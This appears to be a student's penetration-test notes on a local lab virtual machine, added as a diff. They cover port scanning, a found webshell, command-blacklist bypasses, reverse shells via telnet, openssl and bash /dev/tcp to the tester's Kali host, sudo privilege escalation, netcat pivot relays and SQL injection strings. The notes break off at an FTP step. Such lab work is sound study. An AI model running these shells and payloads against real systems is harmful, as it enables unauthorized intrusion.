@@ -1,0 +1,118 @@
+Initial Stuff
+192.168.149.138 = Vuln machine
+192.168.149.129 = Kali
+Nmap results:
+21 vsftpd 3.0.3
+22 OpenSSH 7.6
+80 Apache 2.4.29
+Kernel: Linux 4.x or 5.x
+
+Web Page
+Template soccer club website
+Looked around myself, nothing super interesting
+Login and register buttons are not configured
+ZAP spider and attack failed to reveal anything
+Nikto discovered /secret/
+It is a webshell
+Also discovered /css/
+Directory
+
+Webshell
+whoami
+Www-data
+Appears to be locked down, “nc” triggers an alarm calling me a hacker
+Blacklisted commands:
+Ls, nc, cat, python, python3, php, bash, perl, sh, more, less, head, tail
+Broken Commands?
+Ssh, cd, ftp, gcc, tcp, alias, who, 
+Allowed commands
+telnet, apt, apt-get, sudo, wc, last, w, dir, openssl
+Looking around
+You can use “stat *” as a workaround for ls
+Sudo -l reveals user www-data can run “/home/apaar/.helpline.sh” as user “apaar” with no password
+Welcome to helpline?
+Sends “concerns” to /dev/null, nice
+Dir /home reveals 3 home directories, anurodh, apaar, and aurick
+In place of “cat” I can curl file:///etc/passwd, for example, to read local files
+Workaround?
+Weird web filter looks for blacklisted words, but will not catch it they are “part” of another word, ex typing bashtest will not trigger the hacker message
+Use this to your advantage by calling absolute path of program (I think I said that right)
+/bin/ls does not trigger alarm, ls does
+Same with /bin/cat
+/bin/nc and /usr/bin/python still don’t work?
+Shell appears to kill process/have no memory of previous command, making reverse shells difficult to execute
+Telnet reverse shell shows promise…
+echo $(mktemp -u)
+mkfifo /tmp/tmp.EvkTWaS2la && telnet 192.168.149.129 4444 0</tmp/tmp.EvkTWaS2la && /bin/sh 1>/tmp/tmp.EvkTWaS2la
+It works, but the shell is weird
+OpenSSL shell
+Straight from gtfobins
+Kali:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+Vuln Machine
+mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.149.129:12345 > /tmp/s; /bin/rm /tmp/s
+Got a shell, but it is a “dumb” shell
+Upgrade dumb shell
+set | grep TERM
+TERM = dumb
+Thats funny, I was calling it a dumb shell before I saw this
+export TERM = xterm-256color
+ Commands like “clear” work now
+Reverse Shell - WWW-DATA
+As noted before with sudo -l, www-data can execute /home/apaar/.helpline.sh
+sudo -u apaar /home/apaar/.helpline.sh
+bash
+bash 
+bash -c 'exec bash -i &>/dev/tcp/192.168.149.129/4444 <&1'
+.helpline.sh executes the input given to it
+Just pass “bash” to the read prompts and you can gain a shell as apaar
+
+USER SHELL - APAAR
+Weird shell, used bash rev shell I already had prepared to make the shell look nicer
+bash -c 'exec bash -i &>/dev/tcp/192.168.149.129/4444 <&1'
+ss -lnpt
+Mysql server running on port 3306 on loopback address?
+Something running on 9001?
+Returns html and claims to be apache
+Looks like DNS on port 53?
+Cat /etc/group
+user aurick is part of sudo group
+Sign-in Page
+curl localhost@9001
+Appears to be a login page
+I know there is a sql server, could this form be vulnerable to a sql injection?
+That explains 9001 and 3306, but what about the DNS (53)?
+Only available locally, so I made a nc HTTP proxy
+mkfifo /tmp/fifo
+nc -lk -p 2222 </tmp/fifo | nc localhost 9001 >/tmp/fifo
+Works once and then breaks, what did you expect from this “proxy”
+Another cursed proxy
+Used fifo from above
+Chmod 777 fifo
+nc -lvp 9001 0</tmp/fifo | nc -n 127.0.0.1 9001 1>/tmp/fifo
+Works one time, you have to manually restart it after every submission
+Tried the first sqli on a sheet I use SQLI SHEET
+nc: temporary failure in name resolution
+Works fine with stuff like test:test?
+Maybe the nc tunnel cant handle a different page as a response?
+Try Three
+Got a nc relay from Mr. West’s pivoting powerpoint
+nc -lvvkp 5555 0</tmp/fifo | nc 127.0.0.1 9001 | tee /tmp/fifo
+cURL to POST data?
+touch /tmp/out.html
+curl -s -d "username=or 1=1#%&submit=Submit" 127.0.0.1:9001 > /tmp/out.html
+Turns out I missed something important
+I missed a SQL injection vulnerability in the external apache server
+Accounts.php has a sql query “SELECT * FROM users WHERE username='$un' AND password='$pw'”
+Vuln to root' or 1=1--
+Could use it to get a username:password for ssh?
+Would allow me to get an actual working tunnel
+
+FTP Server
+I overlooked the fact that the files I initially missed may be accessed via the ftp server
+When I originally tried to access I was prompted a username/password
+Try with a web browser
+ftp://192.168.149.138
+Note.txt tells me there is some sort of protection inside the ftp
+Problem clearly set up for directory traversal
